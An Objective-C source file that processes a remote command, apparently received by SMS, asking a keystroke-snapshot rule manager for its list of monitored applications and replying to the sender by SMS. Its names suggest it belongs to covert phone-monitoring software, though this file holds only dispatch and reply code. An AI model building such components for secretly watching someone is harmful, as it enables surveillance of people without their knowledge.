//
//  RequestMonitorApplicationsProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 11/15/13.
//  Copyright (c) 2013 __MyCompanyName__. All rights reserved.
//

#import "RequestMonitorApplicationsProcessor.h"




@interface RequestMonitorApplicationsProcessor (PrivateAPI)
- (void) processRequestMonitorApplications;
- (void) acknowldgeMessage;
- (void) requestMonitorApplicationsException;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end



@implementation RequestMonitorApplicationsProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the RequestMonitorApplicationsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (RequestMonitorApplicationsProcessor).
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestMonitorApplicationsProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}



#pragma mark RequestMonitorApplicationsProcessor Methods



/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestMonitorApplicationsProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"RequestMonitorApplicationsProcessor--->doProcessingCommand")
	[self processRequestMonitorApplications];
}



#pragma mark SyncMonitorApplicaitonsProcessor Private Methods



/**
 - Method name: processRequestMonitorApplications
 - Purpose:This method is used to process request monitor applications
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) processRequestMonitorApplications {
	DLog (@"RequestMonitorApplicationsProcessor--->processRequestMonitorApplications")
	
    id <KeySnapShotRuleManager> keySnapShotRuleMgr = [[RemoteCmdUtils sharedRemoteCmdUtils] mKeySnapShotRuleManager];
    
	BOOL isReady = [keySnapShotRuleMgr requestSendMonitorApplications:self];
    
    if (!isReady) {        
		DLog (@"!!! not ready to process RequestMonitorApplications command")
		[self requestMonitorApplicationsException];
	}
	else {
		DLog (@".... processing RequestMonitorApplications command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			requestMonitorApplicationsException
 - Purpose:				This method is invoked when it fails to sync Monitor Applications
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestMonitorApplicationsException {
	DLog (@"RequestMonitorApplicationsProcessor ---> requestMonitorApplicationsException");
	FxException* exception = [FxException exceptionWithName:@"requestMonitorApplicationsException" andReason:@"Request Monitor Applications error"];
	[exception setErrorCode:kKeySnapShotRuleManagerBusyToRequestMonitorApplications];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
 */

- (void) acknowldgeMessage {
    DLog (@"RequestMonitorApplicationsProcessor--->acknowldgeMessage")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *ackMessage    = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestMonitorApplicationsMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestMonitorApplicationsProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when request monitor applications process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"RequestMonitorApplicationsProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}


#pragma mark MonitorApplicationRequestDelegate Delegate Methods


/**
 - Method name: requestMonitorApplicationsCompleted
 - Purpose:This method is invoked when request monitor applications is delivered successfully
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) requestMonitorApplicationsCompleted: (NSError *) aError {
    
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *replyMessage  = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestMonitorApplicationsMSG2", @"")];
	
   	[self sendReplySMS:replyMessage isProcessCompleted:YES];
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

- (void) dealloc {
	DLog (@"RequestMonitorApplicationsProcessor is now dealloced")
	[super dealloc];
}

@end
